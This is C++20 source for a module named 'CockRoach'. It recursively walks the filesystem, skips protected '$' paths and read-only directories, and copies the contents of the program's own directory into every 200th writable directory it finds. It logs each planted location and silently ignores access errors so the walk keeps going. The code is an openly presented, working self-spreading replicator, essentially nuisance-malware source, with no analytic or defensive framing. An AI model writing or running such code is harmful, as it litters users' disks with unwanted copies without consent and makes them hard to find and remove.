module;

export module CockRoach;

#include <string>
#include <stdexcept>
#include <filesystem>
#include <fstream> 

namespace fs = std::filesystem;

constexpr auto NEED_TO_COPY{ 200 };
static auto g_Counter{ 0 };

const auto DEFAULT_PATH{ fs::current_path() };

static std::ofstream g_LogFile{ "Log.txt" };

export namespace CockRoach
{

	void ScanDirectory(const std::string& start_directory = fs::current_path().generic_string(), const fs::path& from_copy = DEFAULT_PATH)
	{	
		auto check_valid = [](const fs::directory_entry& object)
		{
			if (!object.path().generic_string().contains('$'))
			{
				if (object.is_directory())
				{
					if ((object.status().permissions() & fs::perms::owner_write) != fs::perms::none)
					{
						return true;
					}
				}
			}

			return false;
		};

		if (!fs::exists(start_directory))
		{
			throw std::invalid_argument("Directory is not found!");
		}

		try
		{
			fs::directory_iterator directory_iter{ start_directory }; // here an exception is thrown for a directory that is not accessible

			for (const auto& elem : directory_iter)
			{
				if (check_valid(elem))
				{
					if (g_Counter == NEED_TO_COPY)
					{
						fs::copy(from_copy, elem.path());
						g_LogFile << elem.path() << "\n";

						g_Counter = 0;
					}
					else
					{
						++g_Counter;
						ScanDirectory(elem.path().generic_string(), from_copy);
					}	
				}			
			}
		}
		catch (const std::exception& )
		{
			return; // this is necessary to exit the recursive function to a higher level
		}
	}
}